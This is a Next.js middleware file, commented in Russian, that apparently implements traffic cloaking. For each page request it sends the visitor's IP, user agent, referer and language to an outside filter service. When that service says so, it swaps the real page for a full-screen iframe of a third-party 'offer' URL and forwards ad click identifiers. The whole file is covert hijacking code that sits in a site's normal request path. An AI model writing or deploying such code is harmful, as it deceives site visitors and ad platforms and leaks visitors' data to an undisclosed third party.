import { NextRequest, NextResponse } from 'next/server'

const FILTER_URL = 'https://filter-service-kappa.vercel.app'
const SITE_ID    = '0b6fc8cc-e14e-4c30-b4ab-d41908ac80b5'

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl
  if (/^\/(api|_next|favicon)/.test(pathname)) return NextResponse.next()

  // Совместимый таймаут (AbortSignal.timeout недоступен в старых Edge-рантаймах)
  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), 2000)

  try {
    const res = await fetch(`${FILTER_URL}/api/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sid:  SITE_ID,
        ip:   req.headers.get('x-forwarded-for')?.split(',')[0].trim() ?? '',
        ua:   req.headers.get('user-agent') ?? '',
        ref:  req.headers.get('referer') ?? '',
        lang: req.headers.get('accept-language') ?? '',
      }),
      signal: ctrl.signal,
    })
    clearTimeout(timer)

    if (!res.ok) return NextResponse.next()

    const data = await res.json().catch(() => null)
    if (!data || data.action !== 'redirect' || !data.url) return NextResponse.next()

    const utms = new URLSearchParams()
    req.nextUrl.searchParams.forEach((v, k) => {
      if (k.startsWith('utm_') || ['fbclid','gclid','ttclid','twclid','msclkid','click_id'].includes(k)) {
        utms.set(k, v)
      }
    })
    const utmStr = utms.toString()
    const offerUrl = utmStr ? data.url + (data.url.includes('?') ? '&' : '?') + utmStr : data.url

    // Origin оффера для preconnect — браузер начнёт DNS/TCP/TLS до парсинга <iframe>
    let offerOrigin = ''
    try { offerOrigin = new URL(data.url).origin } catch {}
    const hints = offerOrigin
      ? `<link rel="preconnect" href="${offerOrigin}"><link rel="dns-prefetch" href="${offerOrigin}">`
      : ''

    const html = `<!DOCTYPE html><html style="margin:0;padding:0;overflow:hidden"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">${hints}</head><body style="margin:0;padding:0;overflow:hidden"><iframe src="${offerUrl}" style="position:fixed;top:0;left:0;width:100%;height:100%;border:0" allowfullscreen loading="eager" fetchpriority="high"></iframe></body></html>`

    const headers: Record<string, string> = { 'Content-Type': 'text/html; charset=utf-8' }
    // Link-заголовок дублирует preconnect через HTTP — браузер видит хинт
    // ещё до парсинга <head>, что даёт +20-50мс на медленных соединениях.
    if (offerOrigin) {
      headers['Link'] = `<${offerOrigin}>; rel=preconnect, <${offerOrigin}>; rel=dns-prefetch`
    }

    return new NextResponse(html, { headers })
  } catch {
    clearTimeout(timer)
    return NextResponse.next()
  }
}

export const config = {
  matcher: ['/((?!api|_next|favicon).*)'],
}
